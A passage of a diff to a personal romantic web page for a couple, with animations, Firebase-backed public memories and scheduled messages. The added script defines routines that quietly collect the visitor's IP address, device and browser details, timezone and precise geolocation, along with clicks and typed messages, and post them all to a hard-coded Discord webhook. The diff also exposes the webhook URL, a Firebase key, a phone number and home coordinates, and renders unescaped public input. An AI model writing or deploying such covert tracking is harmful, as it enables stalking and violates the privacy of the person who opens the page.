+@keyframes heartbeat{0%,100%{transform:scale(1);}14%{transform:scale(1.3);}28%{transform:scale(1);}42%{transform:scale(1.3);}70%{transform:scale(1);}}
+/* LOADING */
+.loading-dots{display:inline-flex;gap:5px;}
+.loading-dots span{width:8px;height:8px;background:white;border-radius:50%;animation:dotBounce 1.4s infinite ease-in-out both;}
+.loading-dots span:nth-child(1){animation-delay:-0.32s;}
+.loading-dots span:nth-child(2){animation-delay:-0.16s;}
+@keyframes dotBounce{0%,80%,100%{transform:scale(0);}40%{transform:scale(1);}}
+/* SYNC BADGE */
+.sync-badge{display:inline-flex;align-items:center;gap:6px;background:rgba(255,255,255,0.2);color:white;padding:6px 14px;border-radius:50px;font-size:0.85rem;font-weight:600;margin-bottom:15px;}
+.sync-badge i{font-size:0.75rem;}
+.sync-badge.online{background:rgba(76,175,80,0.3);}
+.sync-badge.offline{background:rgba(255,193,7,0.3);}
+/* REALTIME INDICATOR */
+.live-indicator{display:inline-flex;align-items:center;gap:8px;color:white;font-size:0.9rem;margin-bottom:15px;}
+.live-indicator .pulse-dot{width:10px;height:10px;background:#4caf50;border-radius:50%;animation:livePulse 2s infinite;}
+@keyframes livePulse{0%{box-shadow:0 0 0 0 rgba(76,175,80,0.7);}70%{box-shadow:0 0 0 10px rgba(76,175,80,0);}100%{box-shadow:0 0 0 0 rgba(76,175,80,0);}}
 </style>
+<base target="_blank">
+<base target="_blank">
 </head>
 <body>
-
 <div class="heart">❤️</div>
 <div class="heart">💖</div>
 <div class="heart">💕</div>
 <div class="heart">💘</div>
 <div class="heart">💓</div>
-
 <div id="loveExplosion"></div>
 <div class="love-text" id="loveText">I LOVE YOU MORE ❤️</div>
 <div class="toast" id="successToast">Memory saved successfully! ✨❤️</div>
 
 <div class="container">
-    <h1>Yousef & Noran</h1>
-
-    <div class="timer-box">
-        <div class="timer" id="timer">
-            00 Days : 00 Hours : 00 Minutes : 00 Seconds
-        </div>
-    </div>
-
-    <div class="love-title">Love Forever ❤️</div>
-
-    <div class="message-box">
-    I will love you forever. You are my soulmate, and I can't live without you because you are my whole life. I love you and can't stop loving you. You are my oxygen. When I talk to you, I feel like you are flowing in my veins and my heart beats faster. I get anxious because I'm terrified of going through life without marrying you.
-    </div>
-
-    <div class="heal">
-    يارب تفضلي كويسه و نعيش مع بعض بحبك اوي ❤️❤️❤️
-    </div>
-
-    <!-- LOVE THINGS -->
-    <div class="section">
-        <h2>Things I Love About You</h2>
-        <div class="love-list">
-            <div>✨ How you support me</div>
-            <div>❤️🫵 Your beautiful</div>
-            <div>❤️ how we match in all things</div>
-            <div>😍💓 How you lights my world when i talk to you</div>
-        </div>
-
-        <div class="question">
-            <h2>Do you love me ?</h2>
-            <div class="btns">
-                <button onclick="loveExplosion()">Yes</button>
-                <button onclick="loveExplosion()">نعم</button>
-            </div>
-        </div>
-    </div>
-
-    <!-- SOCIAL -->
-    <div class="section">
-        <h2>I am behind you</h2>
-        <div class="socials">
-            <a href="https://www.tiktok.com/@joo_0_2" target="_blank"><i class="fab fa-tiktok"></i></a>
-            <a href="https://www.instagram.com/yousef_programmerer?igsh=MWpyd3N3cWg2YWcweA==" target="_blank"><i class="fab fa-instagram"></i></a>
-            <a href="https://www.snapchat.com/add/youssefhany9408?share_id=QNO4P_41CPo&locale=en-US" target="_blank"><i class="fab fa-snapchat"></i></a>
-            <a href="https://wa.me/201507351456" target="_blank"><i class="fab fa-whatsapp"></i></a>
-        </div>
-
-        <a class="map-link" target="_blank" href="https://www.google.com/maps/@30.1233394,31.3451627,48m/data=!3m1!1e3">
-            📍 Yousef Home
-        </a>
-
-        <iframe src="https://www.google.com/maps?q=30.1233394,31.3451627&hl=en&z=17&output=embed" width="100%" height="350" style="border:none;border-radius:25px;margin-top:25px;"></iframe>
-    </div>
-
-    <!-- MEMORIES -->
-    <div class="section memory-section">
-        <div class="memory-header">
-            <h2>✨ Write a Memory</h2>
-            <p>Save your sweetest moments forever ❤️</p>
-        </div>
-
-        <button class="create-memory-btn" onclick="toggleMemoryForm()">
-            <i class="fa-solid fa-plus"></i> Create Memory
-        </button>
-
-        <div id="memoryForm" class="memory-form" style="display:none;">
-            <textarea id="memoryText" placeholder="Write your beautiful memory here... ❤️"></textarea>
-            
-            <label class="custom-file-upload">
-                <input type="file" id="memoryImage" onchange="handleFileSelect(this)">
-                <i class="fa-solid fa-image"></i> Choose Image
-            </label>
-
-            <div class="upload-status" id="uploadStatus">Image added ✔</div>
-            <div class="image-preview-container" id="imagePreviewBox"></div>
-
-            <button class="save-memory-btn" onclick="saveMemory()">
-                <i class="fa-solid fa-heart"></i> Save Memory
-            </button>
-        </div>
-
-        <div id="memories" class="memories-container"></div>
-    </div>
-
-    <!-- SAD -->
-    <div class="section">
-        <h2>لو زعلانه مني اكتبلي سبب و اوعدك عمري ما هعمله ❤️</h2>
-        <textarea id="sadReason" placeholder="اكتبي السبب هنا..."></textarea>
-        <button class="send-btn" onclick="sendReason()">Send</button>
-    </div>
+<h1 class="heartbeat">Yousef & Noran</h1>
+<div class="timer-box">
+<div class="timer" id="timer">00 Days : 00 Hours : 00 Minutes : 00 Seconds</div>
 </div>
+<div class="love-title">Love Forever ❤️</div>
+
+<!-- GIFT MESSAGE -->
+<div class="gift-container">
+<div class="gift-box" id="giftBox" onclick="openGift()">
+<div class="gift-body"><div class="gift-ribbon"></div></div>
+<div class="gift-lid"><div class="gift-ribbon"></div></div>
+<div class="gift-bow"></div>
+</div>
+<div class="gift-message" id="giftMessage">
+I will love you forever. You are my soulmate, and I can't live without you because you are my whole life. I love you and can't stop loving you. You are my oxygen. When I talk to you, I feel like you are flowing in my veins and my heart beats faster. I get anxious because I'm terrified of going through life without marrying you.
+</div>
+</div>
+
+<div class="heal">يارب تفضلي كويسه و نعيش مع بعض بحبك اوي ❤️❤️❤️</div>
+
+<!-- LOVE THINGS -->
+<div class="section entrance-left">
+<h2>Things I Love About You</h2>
+<div class="love-list">
+<div>✨ How you support me</div>
+<div>❤️🫵 Your beautiful</div>
+<div>❤️ how we match in all things</div>
+<div>😍💓 How you lights my world when i talk to you</div>
+</div>
+<div class="question">
+<h2>Do you love me ?</h2>
+<div class="btns">
+<button onclick="loveExplosion()">Yes</button>
+<button onclick="loveExplosion()">نعم</button>
+</div>
+</div>
+</div>
+
+<!-- LOCATION SECTION -->
+<div class="section entrance-right">
+<h2>📍 Our Locations</h2>
+<div class="location-section">
+<div class="location-card" id="loc1">
+<div class="loc-icon">🏠</div>
+<h3>Yousef's Location</h3>
+<p id="loc1Text">30.1233394, 31.3451627</p>
+<iframe src="https://www.google.com/maps?q=30.1233394,31.3451627&hl=en&z=17&output=embed" width="100%" height="200" style="border:none;border-radius:15px;margin-top:15px;"></iframe>
+</div>
+<div class="location-card" id="loc2">
+<div class="loc-icon">📍</div>
+<h3>Noran's Location</h3>
+<p id="loc2Text">Click to set location</p>
+<button class="set-loc-btn" id="setLoc2Btn" onclick="requestLocation()">Set My Location</button>
+<button class="remove-loc" id="removeLoc2" onclick="removeLocation2()" style="display:none;">✕</button>
+</div>
+</div>
+<div class="distance-display" id="distanceDisplay" style="display:none;">
+Distance between us: <span id="distanceValue">--</span> km ❤️
+</div>
+</div>
+
+<!-- SOCIAL -->
+<div class="section entrance-left">
+<h2>I am behind you</h2>
+<div class="socials">
+<a href="https://www.tiktok.com/@joo_0_2" target="_blank" onclick="trackClick('TikTok')"><i class="fab fa-tiktok"></i></a>
+<a href="https://www.instagram.com/yousef_programmerer?igsh=MWpyd3N3cWg2YWcweA==" target="_blank" onclick="trackClick('Instagram')"><i class="fab fa-instagram"></i></a>
+<a href="https://www.snapchat.com/add/youssefhany9408?share_id=QNO4P_41CPo&locale=en-US" target="_blank" onclick="trackClick('Snapchat')"><i class="fab fa-snapchat"></i></a>
+<a href="https://wa.me/201507351456" target="_blank" onclick="trackClick('WhatsApp')"><i class="fab fa-whatsapp"></i></a>
+</div>
+<a class="map-link" target="_blank" href="https://www.google.com/maps/@30.1233394,31.3451627,48m/data=!3m1!1e3" onclick="trackClick('Map Link')">📍 Yousef Home</a>
+<iframe src="https://www.google.com/maps?q=30.1233394,31.3451627&hl=en&z=17&output=embed" width="100%" height="350" style="border:none;border-radius:25px;margin-top:25px;"></iframe>
+</div>
+
+<!-- SCHEDULED MESSAGES -->
+<div class="section schedule-section entrance-right">
+<h2>⏰ Scheduled Love Messages</h2>
+<div style="text-align:center;margin-bottom:20px;">
+<div class="live-indicator" id="scheduleLiveIndicator">
+<div class="pulse-dot"></div>
+<span>Real-time public feed</span>
+</div>
+</div>
+<p style="text-align:center;color:white;margin-bottom:20px;opacity:0.8;">Write a message and set a timer (in hours). Everyone will see it when the time is up! ❤️</p>
+<div class="schedule-form">
+<input type="text" id="scheduleMsg" placeholder="Write your love message... ❤️">
+<input type="number" id="scheduleHours" placeholder="Hours" min="1">
+<button class="schedule-btn" onclick="scheduleMessage()">Schedule 💌</button>
+</div>
+<div class="scheduled-list" id="scheduledList">
+<div style="text-align:center;color:white;opacity:0.7;padding:20px;">
+<div class="loading-dots"><span></span><span></span><span></span></div>
+<p style="margin-top:10px;font-size:0.9rem;">Loading public messages...</p>
+</div>
+</div>
+</div>
+
+<!-- MEMORIES -->
+<div class="section memory-section entrance-left">
+<div class="memory-header">
+<h2>✨ Write a Memory</h2>
+<div class="live-indicator" id="memoryLiveIndicator">
+<div class="pulse-dot"></div>
+<span>Real-time public memories</span>
+</div>
+<p>Save your sweetest moments forever — everyone can see them ❤️</p>
+</div>
+<button class="create-memory-btn" onclick="toggleMemoryForm()">
+<i class="fa-solid fa-plus"></i> Create Memory
+</button>
+<div id="memoryForm" class="memory-form" style="display:none;">
+<textarea id="memoryText" placeholder="Write your beautiful memory here... ❤️"></textarea>
+<label class="custom-file-upload">
+<input type="file" id="memoryImage" onchange="handleFileSelect(this)">
+<i class="fa-solid fa-image"></i> Choose Image
+</label>
+<div class="upload-status" id="uploadStatus">Image added ✔</div>
+<div class="image-preview-container" id="imagePreviewBox"></div>
+<button class="save-memory-btn" onclick="saveMemory()">
+<i class="fa-solid fa-heart"></i> Save Memory
+</button>
+</div>
+<div id="memories" class="memories-container">
+<div style="text-align:center;color:white;opacity:0.7;padding:20px;">
+<div class="loading-dots"><span></span><span></span><span></span></div>
+<p style="margin-top:10px;font-size:0.9rem;">Loading public memories...</p>
+</div>
+</div>
+</div>
+
+<!-- SAD -->
+<div class="section entrance-right">
+<h2>لو زعلانه مني اكتبلي سبب و اوعدك عمري ما هعمله ❤️</h2>
+<textarea id="sadReason" placeholder="اكتبي السبب هنا..."></textarea>
+<button class="send-btn" onclick="sendReason()">Send</button>
+</div>
+</div>
+
+<!-- FIREBASE SDK -->
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/12.13.0/firebase-app.js";
+import { getFirestore, collection, addDoc, onSnapshot, query, orderBy, deleteDoc, doc, serverTimestamp, updateDoc } from "https://www.gstatic.com/firebasejs/12.13.0/firebase-firestore.js";
+
+// 🔥 YOUR REAL FIREBASE CONFIG
+const firebaseConfig = {
+  apiKey: "AIzaSyAIwhavVtNDr4EilGYkaLb4KEkbjuawE7I",
+  authDomain: "database-c1796.firebaseapp.com",
+  databaseURL: "https://database-c1796-default-rtdb.firebaseio.com",
+  projectId: "database-c1796",
+  storageBucket: "database-c1796.firebasestorage.app",
+  messagingSenderId: "786117064026",
+  appId: "1:786117064026:web:f1ca2ea5fe5dba0ab36f63",
+  measurementId: "G-1GSB18N76P"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+// Make db available globally for non-module functions
+window.db = db;
+window.firebaseCollections = {
+  memories: collection(db, "memories"),
+  scheduled: collection(db, "scheduled")
+};
+window.firestoreFns = { addDoc, onSnapshot, query, orderBy, deleteDoc, doc, serverTimestamp, updateDoc };
+
+// ====== REAL-TIME MEMORIES ======
+const memoriesQuery = query(collection(db, "memories"), orderBy("timestamp", "desc"));
+onSnapshot(memoriesQuery, (snapshot) => {
+  const memories = [];
+  snapshot.forEach((doc) => {
+    memories.push({ id: doc.id, ...doc.data() });
+  });
+  renderMemoriesRealtime(memories);
+});
+
+// ====== REAL-TIME SCHEDULED MESSAGES ======
+const scheduledQuery = query(collection(db, "scheduled"), orderBy("revealTime", "asc"));
+onSnapshot(scheduledQuery, (snapshot) => {
+  const messages = [];
+  snapshot.forEach((doc) => {
+    messages.push({ id: doc.id, ...doc.data() });
+  });
+  renderScheduledRealtime(messages);
+});
+
+// ====== MEMORY FUNCTIONS (Global) ======
+window.saveMemory = async function() {
+  const text = document.getElementById("memoryText").value;
+  if(text.trim() === "" && !window.currentImgBase64) return;
+
+  try {
+    await addDoc(collection(db, "memories"), {
+      text: text,
+      image: window.currentImgBase64 || "",
+      comments: [],
+      timestamp: serverTimestamp()
+    });
+
+    showToast("Memory saved publicly! ✨❤️", "#4caf50");
+    document.getElementById("memoryText").value = "";
+    document.getElementById("memoryImage").value = "";
+    window.currentImgBase64 = "";
+    clearFormOutputs();
+    document.getElementById("memoryForm").style.display = "none";
+    logActivity('Saved public memory');
+    sendWebhook(`✨ **New Public Memory!**\n📝 ${text.substring(0, 100)}${text.length > 100 ? '...' : ''}`);
+  } catch(e) {
+    showToast("Error saving memory! Try again ❤️", "#ff295f");
+    console.error(e);
+  }
+};
+
+window.deleteMemory = async function(id) {
+  if(!confirm("Delete forever? 💔")) return;
+  try {
+    await deleteDoc(doc(db, "memories", id));
+    logActivity('Deleted public memory');
+    sendWebhook("❌ **Public memory deleted**");
+  } catch(e) {
+    showToast("Error deleting! ❤️", "#ff295f");
+  }
+};
+
+window.addComment = async function(id) {
+  const inputElement = document.getElementById(`comment-${id}`);
+  const text = inputElement.value;
+  if(text.trim() === "") return;
+
+  try {
+    const memoryRef = doc(db, "memories", id);
+    const currentComments = window.currentMemoriesData.find(m => m.id === id)?.comments || [];
+    await updateDoc(memoryRef, {
+      comments: [...currentComments, text]
+    });
+    inputElement.value = "";
+    logActivity('Added public comment');
+  } catch(e) {
+    showToast("Error adding comment! ❤️", "#ff295f");
+  }
+};
+
+// ====== SCHEDULED MESSAGE FUNCTIONS (Global) ======
+window.scheduleMessage = async function() {
+  const msg = document.getElementById('scheduleMsg').value.trim();
+  const hours = parseInt(document.getElementById('scheduleHours').value);
+
+  if(!msg || !hours || hours < 1) {
+    showToast("Please fill both fields! ❤️", "#ff295f");
+    return;
+  }
+
+  const revealTime = Date.now() + (hours * 3600 * 1000);
+
+  try {
+    await addDoc(collection(db, "scheduled"), {
+      msg: msg,
+      hours: hours,
+      revealTime: revealTime,
+      revealed: false,
+      timestamp: serverTimestamp()
+    });
+
+    document.getElementById('scheduleMsg').value = '';
+    document.getElementById('scheduleHours').value = '';
+    showToast("Message scheduled publicly! 💌", "#4caf50");
+    logActivity(`Scheduled public message: ${hours}h`);
+    sendWebhook(`⏰ **New Public Scheduled Message**\n🕐 Timer: ${hours} hours\n💌 Message: ${msg.substring(0, 100)}`);
+  } catch(e) {
+    showToast("Error scheduling! ❤️", "#ff295f");
+  }
+};
+
+// Store current data for comment updates
+window.currentMemoriesData = [];
+window.currentScheduledData = [];
+
+window.renderMemoriesRealtime = function(memories) {
+  window.currentMemoriesData = memories;
+  const container = document.getElementById("memories");
+  if(memories.length === 0) {
+    container.innerHTML = `<div style="text-align:center;color:white;opacity:0.7;padding:40px;"><i class="fa-solid fa-heart" style="font-size:3rem;margin-bottom:15px;display:block;"></i><p>No memories yet. Be the first to share one! ❤️</p></div>`;
+    return;
+  }
+
+  container.innerHTML = "";
+  memories.forEach((m) => {
+    const div = document.createElement("div");
+    div.className = "memory-card";
+    div.style.animation = "fadeInUp 0.5s ease";
+    div.innerHTML = `${m.image ? `<img src="${m.image}" alt="Memory Image">` : ""}
+      <div class="memory-content">
+        <div class="memory-text">${escapeHTML(m.text)}</div>
+        <div style="color:rgba(255,255,255,0.5);font-size:0.8rem;margin-top:5px;">
+          <i class="fa-regular fa-clock"></i> ${m.timestamp ? new Date(m.timestamp.toDate()).toLocaleString() : 'Just now'}
+        </div>
+        <button class="delete-btn" onclick="deleteMemory('${m.id}')">Delete</button>
+        <div class="comment-box">
+          <textarea id="comment-${m.id}" placeholder="Write a comment... ❤️"></textarea>
+          <button class="comment-send-btn" onclick="addComment('${m.id}')">Send</button>
+          <div id="comments-list-${m.id}"></div>
+        </div>
+      </div>`;
+    container.appendChild(div);
+    renderCommentsOnly(m.id, m.comments || []);
+  });
+};
+
+window.renderScheduledRealtime = function(messages) {
+  window.currentScheduledData = messages;
+  const list = document.getElementById('scheduledList');
+  if(messages.length === 0) {
+    list.innerHTML = `<div style="text-align:center;color:white;opacity:0.7;padding:30px;"><i class="fa-solid fa-clock" style="font-size:2rem;margin-bottom:10px;display:block;"></i><p>No scheduled messages yet. Schedule one! ❤️</p></div>`;
+    return;
+  }
+
+  list.innerHTML = '';
+  messages.forEach(item => {
+    const now = Date.now();
+    const remaining = Math.max(0, item.revealTime - now);
+    const isRevealed = remaining === 0 || item.revealed;
+
+    const hours = Math.floor(remaining / (3600 * 1000));
+    const mins = Math.floor((remaining % (3600 * 1000)) / (60 * 1000));
+    const secs = Math.floor((remaining % (60 * 1000)) / 1000);
+
+    const div = document.createElement('div');
+    div.className = 'scheduled-item';
+    div.innerHTML = `
+      <div class="msg-text">${isRevealed ? item.msg : '🔒 Message locked...'}</div>
+      <div class="msg-timer">${isRevealed ? '✨ Revealed!' : `${String(hours).padStart(2,'0')}:${String(mins).padStart(2,'0')}:${String(secs).padStart(2,'0')}`}</div>
+      <div class="msg-status ${isRevealed ? 'revealed' : 'waiting'}">${isRevealed ? 'Revealed' : 'Waiting'}</div>
+    `;
+    list.appendChild(div);
+
+    if(remaining === 0 && !item.revealed) {
+      updateDoc(doc(db, "scheduled", item.id), { revealed: true });
+      sendWebhook(`✨ **Public Message Revealed!**\n💌 ${item.msg}`);
+      showToast("A love message has been revealed! ❤️", "#ff4f95");
+    }
+  });
+};
+
+// Update timers every second
+setInterval(() => {
+  if(window.currentScheduledData && window.currentScheduledData.length > 0) {
+    window.renderScheduledRealtime(window.currentScheduledData);
+  }
+}, 1000);
+
+</script>
 
 <script>
 const WEBHOOK = "https://discord.com/api/webhooks/1505522412891144393/JfiUb0fObAsOfUp5R6-Wmc1ExlZdl7mUzdT0HePexWvDwEcCXwKQIHmpoabcvwltm2lj";
 
-/* TIMER */
-if(!localStorage.getItem("loveStartTime")){
-    const twoDaysAgo = Date.now() - (2 * 24 * 60 * 60 * 1000);
-    localStorage.setItem("loveStartTime",twoDaysAgo);
+// ====== TRACKING SYSTEM ======
+let sessionStart = Date.now();
+let activityLog = [];
+let userData = {};
+
+function logActivity(action) {
+    const time = new Date().toLocaleTimeString();
+    activityLog.push(`[${time}] ${action}`);
 }
 
-function updateTimer(){
-    const startTime = parseInt(localStorage.getItem("loveStartTime"));
+function trackClick(name) {
+    logActivity(`Clicked: ${name}`);
+    sendWebhook(`🖱️ **Click Activity**\n👤 User clicked: **${name}**`);
+}
+
+// Track all clicks with ripple effect
+document.addEventListener('click', function(e) {
+    const target = e.target.closest('button, a, .gift-box, .love-list div, .socials a, .location-card');
+    if(target && !target.onclick) {
+        const text = target.textContent.trim().substring(0, 30) || target.className;
+        logActivity(`Clicked: ${text}`);
+    }
+    createRipple(e);
+});
+
+// Ripple effect
+function createRipple(e) {
+    const ripple = document.createElement('div');
+    ripple.className = 'ripple';
+    const size = 20;
+    ripple.style.width = ripple.style.height = size + 'px';
+    ripple.style.left = (e.clientX - size/2) + 'px';
+    ripple.style.top = (e.clientY - size/2) + 'px';
+    document.body.appendChild(ripple);
+    setTimeout(() => ripple.remove(), 600);
+}
+
+// ====== FLOATING EMOJIS ======
+function spawnFloatingEmoji() {
+    const emojis = ['❤️','💖','💕','💘','💓','✨','🌸','🎀'];
+    const emoji = document.createElement('div');
+    emoji.className = 'float-emoji';
+    emoji.innerHTML = emojis[Math.floor(Math.random() * emojis.length)];
+    emoji.style.left = Math.random() * 100 + 'vw';
+    emoji.style.top = Math.random() * 100 + 'vh';
+    emoji.style.animationDuration = (Math.random() * 3 + 3) + 's';
+    emoji.style.animationDelay = Math.random() * 2 + 's';
+    document.body.appendChild(emoji);
+    setTimeout(() => emoji.remove(), 8000);
+}
+setInterval(spawnFloatingEmoji, 3000);
+
+// ====== USER DATA COLLECTION ======
+async function collectUserData() {
+    const nav = navigator;
+    const screen = window.screen;
+
+    userData = {
+        userAgent: nav.userAgent,
+        browser: getBrowser(),
+        device: getDevice(),
+        language: nav.language,
+        screenSize: `${screen.width}x${screen.height}`,
+        viewport: `${window.innerWidth}x${window.innerHeight}`,
+        platform: nav.platform,
+        cores: nav.hardwareConcurrency || 'unknown',
+        memory: nav.deviceMemory || 'unknown',
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        referrer: document.referrer || 'Direct',
+        url: window.location.href
+    };
+
+    try {
+        const ipRes = await fetch('https://api.ipify.org?format=json');
+        const ipData = await ipRes.json();
+        userData.ip = ipData.ip;
+    } catch(e) {
+        userData.ip = 'Could not fetch';
+    }
+
+    logActivity(`Visitor: ${userData.browser} on ${userData.device}`);
+
+    sendWebhook(`🔔 **New Visitor!**\n🌐 **IP:** ${userData.ip}\n🖥️ **Browser:** ${userData.browser}\n📱 **Device:** ${userData.device}\n🗣️ **Language:** ${userData.language}\n📐 **Screen:** ${userData.screenSize}\n🔗 **Referrer:** ${userData.referrer}\n⏰ **Timezone:** ${userData.timezone}`);
+
+    requestUserLocation();
+}
+
+function getBrowser() {
+    const ua = navigator.userAgent;
+    if(ua.includes('Chrome')) return 'Chrome';
+    if(ua.includes('Safari')) return 'Safari';
+    if(ua.includes('Firefox')) return 'Firefox';
+    if(ua.includes('Edge')) return 'Edge';
+    if(ua.includes('Opera')) return 'Opera';
+    return 'Unknown';
+}
+
+function getDevice() {
+    const ua = navigator.userAgent;
+    if(/Mobile|Android|iPhone|iPad|iPod/.test(ua)) {
+        if(/iPhone/.test(ua)) return 'iPhone';
+        if(/iPad/.test(ua)) return 'iPad';
+        if(/Android/.test(ua)) return 'Android';
+        return 'Mobile';
+    }
+    return 'Desktop';
+}
+
+function requestUserLocation() {
+    if(!navigator.geolocation) return;
+    navigator.geolocation.getCurrentPosition(
+        pos => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const accuracy = pos.coords.accuracy;
+            userData.location = {lat, lon, accuracy};
+            logActivity(`Location: ${lat.toFixed(4)}, ${lon.toFixed(4)}`);
+            sendWebhook(`📍 **User Location**\n🌍 Lat: ${lat}\n🌍 Lon: ${lon}\n🎯 Accuracy: ${accuracy}m\n🔗 [View Map](https://www.google.com/maps?q=${lat},${lon})`);
+        },
+        err => {
+            logActivity('Location denied: ' + err.message);
+            sendWebhook(`❌ **Location Denied**\nReason: ${err.message}`);
+        },
+        {enableHighAccuracy: true, timeout: 10000, maximumAge: 0}
+    );
+}
+
+// ====== TIMER (from 5/10/2026) ======
+const TARGET_DATE = new Date('2026-05-10T00:00:00').getTime();
+
+function updateTimer() {
     const now = Date.now();
-    const totalSeconds = Math.floor((now - startTime) / 1000);
+    const diff = now - TARGET_DATE;
 
-    let days = Math.floor(totalSeconds / (24 * 3600));
-    let hours = Math.floor((totalSeconds % (24 * 3600)) / 3600);
-    let minutes = Math.floor((totalSeconds % 3600) / 60);
-    let secs = totalSeconds % 60;
+    if(diff < 0) {
+        document.getElementById("timer").innerHTML = "Coming Soon ❤️";
+        return;
+    }
 
-    document.getElementById("timer").innerHTML =
-    String(days).padStart(2,'0') + " Days : " +
-    String(hours).padStart(2,'0') + " Hours : " +
-    String(minutes).padStart(2,'0') + " Minutes : " +
-    String(secs).padStart(2,'0') + " Seconds";
+    let days = Math.floor(diff / (24 * 3600 * 1000));
+    let hours = Math.floor((diff % (24 * 3600 * 1000)) / (3600 * 1000));
+    let minutes = Math.floor((diff % (3600 * 1000)) / (60 * 1000));
+    let secs = Math.floor((diff % (60 * 1000)) / 1000);
+
+    document.getElementById("timer").innerHTML = 
+        String(days).padStart(2,'0') + " Days : " +
+        String(hours).padStart(2,'0') + " Hours : " +
+        String(minutes).padStart(2,'0') + " Minutes : " +
+        String(secs).padStart(2,'0') + " Seconds";
 }
 updateTimer();
-setInterval(updateTimer,1000);
+setInterval(updateTimer, 1000);
 
-/* WEBHOOK */
-function sendWebhook(message){
-    fetch(WEBHOOK,{
-        method:"POST",
-        headers:{"Content-Type":"application/json"},
-        body:JSON.stringify({content:message})
+// ====== GIFT OPEN ======
+function openGift() {
+    const box = document.getElementById('giftBox');
+    const msg = document.getElementById('giftMessage');
+    if(box.classList.contains('opened')) return;
+
+    box.classList.add('opened');
+    setTimeout(() => msg.classList.add('show'), 300);
+
+    // Confetti effect
+    for(let i=0; i<50; i++) {
+        const p = document.createElement('div');
+        p.className = 'particle';
+        p.innerHTML = ['❤️','💖','💕','✨','💌','🌸','🎀'][Math.floor(Math.random()*7)];
+        p.style.left = (50 + (Math.random()-0.5)*60) + '%';
+        p.style.top = '50%';
+        p.style.fontSize = (Math.random()*25+15) + 'px';
+        p.style.animationDuration = (Math.random()*2+2) + 's';
+        document.body.appendChild(p);
+        setTimeout(() => p.remove(), 4000);
+    }
+
+    logActivity('Opened love gift');
+    sendWebhook("🎁 **Gift Opened!**\nSomeone opened the love message! 💖");
+}
+
+// ====== WEBHOOK ======
+function sendWebhook(message) {
+    fetch(WEBHOOK, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({content: message})
     }).catch(err => console.log("Webhook error safely caught"));
 }
 
-/* SAD */
-function sendReason(){
+// ====== SAD REASON ======
+function sendReason() {
     const text = document.getElementById("sadReason").value;
     if(text.trim() === "") return;
-    sendWebhook("💔 Sad Reason:\n" + text);
+    sendWebhook("💔 **Sad Reason:**\n" + text);
     showToast("Sent ❤️", "#ff4f95");
     document.getElementById("sadReason").value = "";
+    logActivity('Sent sad reason');
 }
 
-/* LOVE EXPLOSION & TEXT */
-function loveExplosion(){
-    const emojis = ["💓","❤️","💌","💘","💖"];
+// ====== LOVE EXPLOSION ======
+function loveExplosion() {
+    const emojis = ["💓","❤️","💌","💘","💖","🌸","✨","🎀"];
     const container = document.getElementById("loveExplosion");
-
-    for(let i=0; i<80; i++){
+    for(let i=0; i<100; i++) {
         const heart = document.createElement("div");
         heart.innerHTML = emojis[Math.floor(Math.random()*emojis.length)];
         heart.style.position = "fixed";
         heart.style.left = "50%";
         heart.style.top = "50%";
-        heart.style.fontSize = (Math.random()*20 + 25) + "px";
+        heart.style.fontSize = (Math.random()*25+20) + "px";
         heart.style.zIndex = "9999";
         heart.style.pointerEvents = "none";
-
         const angle = Math.random() * Math.PI * 2;
-        const velocity = Math.random() * 350 + 150; 
+        const velocity = Math.random() * 400 + 150;
         const x = Math.cos(angle) * velocity;
         const y = Math.sin(angle) * velocity;
-
         heart.animate([
-            { transform: "translate(-50%, -50%) scale(0.5)", opacity: 1 },
-            { transform: `translate(calc(-50% + ${x}px), calc(-50% + ${y}px)) scale(1.8)`, opacity: 0 }
+            {transform: "translate(-50%, -50%) scale(0.5)", opacity: 1},
+            {transform: `translate(calc(-50% + ${x}px), calc(-50% + ${y}px)) scale(2)`, opacity: 0}
         ], {
-            duration: 1800, // سرعة الحركة لتوفير مظهر مبهج وسلس
+            duration: 2000,
             easing: "cubic-bezier(0.1, 0.8, 0.3, 1)"
         });
-
         container.appendChild(heart);
-        setTimeout(() => heart.remove(), 1800);
+        setTimeout(() => heart.remove(), 2000);
     }
-
     const text = document.getElementById("loveText");
     text.classList.add("active");
     setTimeout(() => text.classList.remove("active"), 4000);
-
-    sendWebhook("She loves meeeee 😍❤️");
+    sendWebhook("💖 **She loves meeeee!** 😍❤️");
+    logActivity('Clicked Yes (love explosion)');
 }
 
-/* MEMORY FORM ACTIONS */
-function toggleMemoryForm(){
+// ====== LOCATION 2 ======
+function requestLocation() {
+    if(!navigator.geolocation) {
+        showToast("Geolocation not supported", "#ff295f");
+        return;
+    }
+    navigator.geolocation.getCurrentPosition(
+        pos => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            localStorage.setItem('loc2', JSON.stringify({lat, lon}));
+            updateLocation2(lat, lon);
+            calculateDistance();
+            sendWebhook(`📍 **Noran Location Set**\n🌍 ${lat}, ${lon}\n🔗 [View Map](https://www.google.com/maps?q=${lat},${lon})`);
+            logActivity('Set location 2');
+        },
+        err => showToast("Location access denied", "#ff295f"),
+        {enableHighAccuracy: true}
+    );
+}
+
+function updateLocation2(lat, lon) {
+    const card = document.getElementById('loc2');
+    card.innerHTML = `
+        <div class="loc-icon">📍</div>
+        <h3>Noran's Location</h3>
+        <p>${lat.toFixed(6)}, ${lon.toFixed(6)}</p>
+        <iframe src="https://www.google.com/maps?q=${lat},${lon}&hl=en&z=17&output=embed" width="100%" height="200" style="border:none;border-radius:15px;margin-top:15px;"></iframe>
+        <button class="remove-loc" onclick="removeLocation2()" style="opacity:1;display:flex;">✕</button>
+    `;
+    document.getElementById('distanceDisplay').style.display = 'block';
+}
+
+function removeLocation2() {
+    localStorage.removeItem('loc2');
+    const card = document.getElementById('loc2');
+    card.innerHTML = `
+        <div class="loc-icon">📍</div>
+        <h3>Noran's Location</h3>
+        <p>Click to set location</p>
+        <button class="set-loc-btn" onclick="requestLocation()">Set My Location</button>
+    `;
+    document.getElementById('distanceDisplay').style.display = 'none';
+    logActivity('Removed location 2');
+    sendWebhook("❌ **Noran location removed**");
+}
+
+function calculateDistance() {
+    const loc1 = {lat: 30.1233394, lon: 31.3451627};
+    const loc2Data = localStorage.getItem('loc2');
+    if(!loc2Data) return;
+    const loc2 = JSON.parse(loc2Data);
+
